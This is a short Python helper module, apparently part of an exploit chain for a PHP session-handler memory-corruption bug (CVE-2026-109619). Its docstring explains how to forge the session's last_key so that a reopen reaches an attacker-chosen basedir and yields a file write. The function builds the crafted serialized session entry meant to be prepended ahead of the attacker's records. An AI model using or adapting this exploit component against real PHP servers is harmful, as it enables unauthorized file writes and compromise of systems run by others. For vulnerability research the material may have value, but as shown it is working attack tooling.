# INDEX: safe-reopen last_key forcer for basedir write | all | needs per-dangle aliasing calibration
"""last_key-safe-reopen-forcer: make a forged ps_files->last_key survive the reopen's DELREF so
the forced ps_files_open() reaches the forged basedir (CVE-2026-109619 write-delivery helper).

Mechanism (ext/session/mod_files.c ps_files_open_session, Zend/zend_string.h; php-src 8.3/8.4):
  basedir is consulted only when ps_files_open() REOPENs (last_key != the current key); aiming a push
  at last_key forces that reopen. ps_files_open() then runs zend_string_release_ex(last_key): if the
  forged last_key reads refcount 1 the release frees chunk-interior memory and ps_files is lost.
  Making the FIRST decoded session value a large integer lays non-zero bytes over the slot that
  becomes last_key's refcount, so the release is a no-op and the reopen proceeds to the forged basedir.

API:
  large_int_first_entry(name=b"a", value=1<<40) -> bytes.
    The first `php` serialize_handler session record (`name|i:value;`); prepend to the session.

Precondition: per-dangle heap-aliasing calibration -- which integer value lands on last_key's
refcount word, and which slot it aliases.
Credit: kengwang, Calif Research.
"""

DEFAULT_NAME = b"a"
DEFAULT_VALUE = 1 << 40   # a large int -> non-zero bytes over the forged last_key refcount word


def large_int_first_entry(name=DEFAULT_NAME, value=DEFAULT_VALUE):
    """The first `php`-serialized session entry (`name|i:value;`) whose large integer gives the
    forged last_key a non-zero refcount, so ps_files_open()'s zend_string_release_ex is a no-op.
    Returns the serialized bytes (prepend to the session before the attacker records)."""
    name = name if isinstance(name, (bytes, bytearray)) else str(name).encode()
    return bytes(name) + b"|i:" + str(int(value)).encode() + b";"
